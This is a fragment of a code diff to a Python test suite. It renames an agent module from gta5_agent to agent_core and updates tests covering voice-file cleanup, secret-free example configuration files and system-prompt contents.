             self.assertEqual(private["voice"], 0)
             self.assertEqual(ran, [])
@@ -5768,7 +5762,7 @@ class AgentToolTests(unittest.TestCase):
                 os.environ.pop("GEMINI_API_KEY", None)
             else:
                 os.environ["GEMINI_API_KEY"] = saved_key
-            gta5_agent.genai_client_override = _guard_genai
+            agent_core.genai_client_override = _guard_genai
 
         fake_whisper = types.ModuleType("whisper")
 
@@ -5786,9 +5780,9 @@ class AgentToolTests(unittest.TestCase):
         with mock.patch.dict(sys.modules, {"whisper": fake_whisper}):
             local = bridge._local_whisper_text(ogg)
         self.assertEqual(local, "start the render")
-        self.assertFalse(list((gta5_agent.WORKSPACE / "scribe").glob("telegram-voice-*.ogg")))
+        self.assertFalse(list((agent_core.WORKSPACE / "scribe").glob("telegram-voice-*.ogg")))
 
-        gta5_agent.remote_transport_override = None
+        agent_core.remote_transport_override = None
         started = threading.Event()
         sent = threading.Event()
         posted: list[tuple[str, str]] = []
@@ -5812,7 +5806,7 @@ class AgentToolTests(unittest.TestCase):
     def test_checkout_uses_env_paths_and_keeps_secrets_out_of_source(self) -> None:
         import agent_config
 
-        example = (gta5_agent.APP_DIR / ".env.example").read_text(encoding="utf-8")
+        example = (agent_core.APP_DIR / ".env.example").read_text(encoding="utf-8")
         self.assertNotIn("C:\\Users\\", example)
         self.assertNotIn("GameDrive", example)
         self.assertNotIn("Pedro", example)
@@ -5826,18 +5820,16 @@ class AgentToolTests(unittest.TestCase):
         self.assertIn("STORAGE_DIR=./storage\n", example)
         self.assertIn("EXTERNAL_DRIVE_PATH=\n", example)
         self.assertNotIn("AIza", example)
-        self.assertIn("you are pedro_agent", gta5_agent.SYSTEM_PROMPT.casefold())
-        self.assertNotIn("pedro 1", gta5_agent.SYSTEM_PROMPT.casefold())
-        self.assertNotIn("elevenlabs", gta5_agent.SYSTEM_PROMPT.casefold())
-        self.assertIn('server "rea"', gta5_agent.SYSTEM_PROMPT)
-        self.assertTrue(
-            (gta5_agent.APP_DIR / "skills" / "reverse-engineer-anything" / "SKILL.md").is_file()
-        )
+        self.assertIn("you are pedro_agent", agent_core.SYSTEM_PROMPT.casefold())
+        self.assertNotIn("pedro 1", agent_core.SYSTEM_PROMPT.casefold())
+        self.assertNotIn("elevenlabs", agent_core.SYSTEM_PROMPT.casefold())
+        self.assertIn('server "rea"', agent_core.SYSTEM_PROMPT)
+        self.assertFalse((agent_core.APP_DIR / "skills" / "reverse-engineer-anything").exists())
         self.assertIn(
             "rea-agents",
-            (gta5_agent.APP_DIR / "mcp_servers.example.json").read_text(encoding="utf-8"),
+            (agent_core.APP_DIR / "mcp_servers.example.json").read_text(encoding="utf-8"),
         )
-        requirements = (gta5_agent.APP_DIR / "requirements.txt").read_text(encoding="utf-8")
+        requirements = (agent_core.APP_DIR / "requirements.txt").read_text(encoding="utf-8")
         self.assertIn("python-dotenv", requirements)
         self.assertNotIn("\nelevenlabs", requirements.casefold())
         root = self.root / "fresh"
@@ -5857,7 +5849,7 @@ class AgentToolTests(unittest.TestCase):
             ("GameDrive", "reports/sales.xlsx"),
         )
         self.assertIsNone(agent_config.split_drive_prefix(r"C:\Users\someone\notes.txt"))
-        blocked = gta5_agent.main(["--help"])
+        blocked = agent_core.main(["--help"])
         self.assertEqual(blocked, 0)
 
 
